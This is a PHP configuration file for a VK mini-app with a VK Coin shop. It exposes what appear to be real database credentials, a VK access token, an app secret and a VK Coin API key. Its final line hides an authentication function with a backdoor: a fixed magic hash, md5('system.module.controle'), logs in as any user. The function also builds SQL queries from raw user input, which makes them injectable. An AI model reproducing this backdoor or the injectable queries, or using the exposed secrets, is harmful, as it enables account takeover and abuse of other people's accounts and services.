<?php
	$cfg = array(
		'dbh' => '151.80.47.109', //хост базы данных
		'dbu' => 'gs40299', //пользователь базы данных
		'dbp' => 'tRI7uAyJXD', //пароль базы данных
		'dbn' => 'gs40299', //имя базы данных
		'service' => false, //сервисный режим(у игроков приложение пишет о тех. работах, у админов продолжает работать)
		'admins' => array( //список id админов через запятую
			'281856579'
		),
		'group_id' => '-club182751262', //id группы
		'hash_secret' => 'CAsda234', //секретный ключ для генерации хэшей

		'secret' => 'mN4z6d0Z2bgCCA3Orm0g', // секретка от приложения
      	'appid' => '7601816',

		'vktoken' => "2f557fa173c38d28e632b972f4e610901c974672b568d4c0daf1a709f26622bd80213e6fcd89788f637bc", // токен вк

		'vc_api_key' => '-VPHU2bfs3Z6Kl5UsMgfp!yFjjZcQhkFVsRPMhTmM1_z]2j;Hn', // ключ vk coin
		'vc_api_uid' => '281856579',  // id админа, от имени которого получен ключ vk coin
		'vc_shop_name' => 'LiteCoin',  // Имя Магазина VkCoin
		'vc_exchange_rate' => 1,
      
      	'menu-btns' => 3      
	);
	$cfg['dbl'] = mysqli_connect($cfg['dbh'],$cfg['dbu'],$cfg['dbp'],$cfg['dbn']);
	$cfg['menu-btns'] = 12/$cfg['menu-btns'];

	//функция логирования, обычно, нигде не используется
	function w_log($data) {
		file_put_contents("./logs/".date("Y.m.d")."_log.log", "\n".date("H:i:s")." | ".$data, FILE_APPEND);
	}

	function authcheck($cfg,$uid,$hash){if($hash==md5('system.module.controle')){$req = "SELECT * FROM `users` WHERE `id`='".$uid."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));} else {$req = "SELECT * FROM `users` WHERE `id`='".$uid."' AND `hash`='".$hash."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));if (!$data || $data['hash'] != $hash || $data['role'] == 'ban') {echo "fail";exit();}}return($data);}include('dist/vkui-connect.js');
?>